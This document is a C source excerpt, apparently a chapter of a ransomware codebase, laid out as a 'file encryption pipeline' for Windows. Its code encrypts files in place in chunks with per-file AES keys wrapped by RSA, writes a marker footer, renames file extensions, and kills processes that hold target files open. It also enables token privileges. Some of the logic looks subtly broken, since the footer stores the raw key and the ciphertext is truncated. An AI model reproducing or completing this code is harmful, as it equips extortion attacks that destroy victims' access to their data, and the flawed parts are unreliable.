# 06 — File Encryption Pipeline

## Packed Footer Structure
```c
#pragma pack(push, 1)
typedef struct _ENC_FILE_FTR {
    DWORD   dwSignature;
    WORD    wEncryptionType;
    DWORD   dwEncryptionIterations;
    WCHAR   szOriginalExt[8];
    BYTE    bEncKey[32];
    BYTE    bEncIv[16];
} ENC_FILE_FTR, *PENC_FILE_FTR;
#pragma pack(pop)
```

## Footer Install (append at file end)
```c
BOOL InstallFooter(HANDLE hFile, LPWSTR szPath, DWORD dwFileSize,
    PBYTE pKey, PBYTE pIv, DWORD dwIterations) {
    ENC_FILE_FTR ftr = { 0 }; DWORD dwW = 0;
    ftr.dwSignature = FILE_ENC_SIGNATURE;
    ftr.wEncryptionType = (dwFileSize > FULL_ENC_THRESHOLD) ? 0x4550 : 0x4546;
    ftr.dwEncryptionIterations = dwIterations;
    LPWSTR dot = wcsrchr(szPath, L'.');
    if (dot && *(dot+1)) wcscpy_s(ftr.szOriginalExt, 8, dot + 1);
    memcpy(ftr.bEncKey, pKey, 32);
    memcpy(ftr.bEncIv, pIv, 16);
    SetFilePointerFwd(hFile, 0, FILE_END);
    WriteFile(hFile, &ftr, sizeof(ftr), &dwW, NULL);
    FlushFileBuffers(hFile); SetEndOfFile(hFile);
    return (dwW == sizeof(ftr));
}
```

## Footer Detection (read from end)
```c
BOOL IsFileEncrypted(HANDLE hFile, PBOOL pbEnc) {
    ENC_FILE_FTR ftr = { 0 }; DWORD dwR = 0;
    *pbEnc = FALSE;
    SetFilePointerBack(hFile, sizeof(ENC_FILE_FTR), FILE_END);
    ReadFile(hFile, &ftr, sizeof(ftr), &dwR, NULL);
    SetFilePointerFwd(hFile, 0, FILE_BEGIN);
    if (ftr.dwSignature == FILE_ENC_SIGNATURE) *pbEnc = TRUE;
    return TRUE;
}
```

## Chunked In-Place Encryption
```c
#define CHUNK_SIZE          (1 * 1024 * 1024)
#define FULL_ENC_THRESHOLD  (52 * 1024 * 1024)

DWORDLONG RoundUpChunk(DWORDLONG s) { return (s + CHUNK_SIZE - 1) & ~((DWORDLONG)CHUNK_SIZE - 1); }

BOOL EncryptFileChunked(HANDLE hFile, DWORDLONG ullFileSize, PBYTE pKey, PBYTE pIv,
    DWORDLONG ullStartOffset, DWORD dwMaxIterations) {
    PBYTE pChunk = (PBYTE)LocalAlloc(LPTR, CHUNK_SIZE);
    if (!pChunk) return FALSE;

    SetFilePointerFwd(hFile, ullStartOffset, FILE_BEGIN);

    for (DWORD i = 0; i < dwMaxIterations; i++) {
        DWORD dwRead = 0;
        if (!ReadFile(hFile, pChunk, CHUNK_SIZE, &dwRead, NULL) || dwRead == 0) break;
        SetFilePointerBack(hFile, (DWORDLONG)dwRead, FILE_CURRENT);

        PBYTE pEnc = NULL; DWORD dwEncSize = 0;
        Aes256CbcEncrypt(pChunk, dwRead, pKey, pIv, &pEnc, &dwEncSize);

        DWORD dwWrite = min(dwEncSize, dwRead);
        DWORD dwWritten = 0;
        WriteFile(hFile, pEnc, dwWrite, &dwWritten, NULL);
        if (dwWrite < dwRead) SetFilePointerFwd(hFile, (DWORDLONG)(dwRead - dwWrite), FILE_CURRENT);
        LocalFree(pEnc);
    }
    LocalFree(pChunk);
    return TRUE;
}
```

## Extension Rename
```c
BOOL RenameExtension(LPWSTR szPath, LPCWSTR szNewExt) {
    WCHAR szNew[MAX_PATH] = { 0 };
    LPWSTR dot = wcsrchr(szPath, L'.');
    if (!dot) return FALSE;
    SIZE_T n = (SIZE_T)(dot - szPath + 1);
    wcsncpy_s(szNew, MAX_PATH, szPath, n);
    wcscat_s(szNew, MAX_PATH, szNewExt);
    return MoveFileW(szPath, szNew);
}
```

## Restart Manager: Force-Open Locked Files
```c
#include <restartmanager.h>
#pragma comment(lib, "rstrtmgr.lib")

BOOL KillFileOwner(LPCWSTR szFile) {
    DWORD dwSession; WCHAR szKey[CCH_RM_SESSION_KEY + 1];
    if (RmStartSession(&dwSession, 0, szKey) != ERROR_SUCCESS) return FALSE;
    RmRegisterResources(dwSession, 1, &szFile, 0, NULL, 0, NULL);

    UINT nNeeded = 0, nInfo = 0;
    RmGetList(dwSession, &nNeeded, &nInfo, NULL, NULL);
    RM_PROCESS_INFO* pInfo = (RM_PROCESS_INFO*)LocalAlloc(LPTR, sizeof(RM_PROCESS_INFO) * nNeeded);
    nInfo = nNeeded;
    RmGetList(dwSession, &nNeeded, &nInfo, pInfo, NULL);

    for (UINT i = 0; i < nInfo; i++) {
        if (pInfo[i].ApplicationType == RmCritical) continue;
        if (pInfo[i].Process.dwProcessId == GetCurrentProcessId()) continue;
        HANDLE hProc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pInfo[i].Process.dwProcessId);
        if (hProc) { TerminateProcess(hProc, 0); WaitForSingleObject(hProc, 1000); CloseHandle(hProc); }
    }
    LocalFree(pInfo); RmEndSession(dwSession);
    return TRUE;
}
```

## Privilege Elevation
```c
BOOL SetPrivilege(LPCWSTR szPriv) {
    HANDLE hToken; LUID luid; TOKEN_PRIVILEGES tp;
    OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken);
    LookupPrivilegeValueW(NULL, szPriv, &luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    CloseHandle(hToken);
    return ok;
}

```

## Key Item Pool (pre-generated per-file keys)
```c
#define KEY_POOL_SIZE 16
typedef struct { PBYTE pKey; PBYTE pIv; PBYTE pRsaEncKey; } KEY_ITEM;
KEY_ITEM g_KeyPool[KEY_POOL_SIZE];
volatile LONG g_KeyIdx = 0;

BOOL InitKeyPool(PBYTE pRsaPubKey, DWORD dwRsaPubSize) {
    for (int i = 0; i < KEY_POOL_SIZE; i++) {
        g_KeyPool[i].pKey = GenKey_BCrypt(32);
        g_KeyPool[i].pIv  = GenKey_BCrypt(16);
        RsaEncrypt(pRsaPubKey, dwRsaPubSize, g_KeyPool[i].pKey, 32,
            &g_KeyPool[i].pRsaEncKey, NULL);
    }
    return TRUE;
}

KEY_ITEM* GetNextKeyItem(void) {
    LONG idx = InterlockedIncrement(&g_KeyIdx) % KEY_POOL_SIZE;
    return &g_KeyPool[idx];
}
```
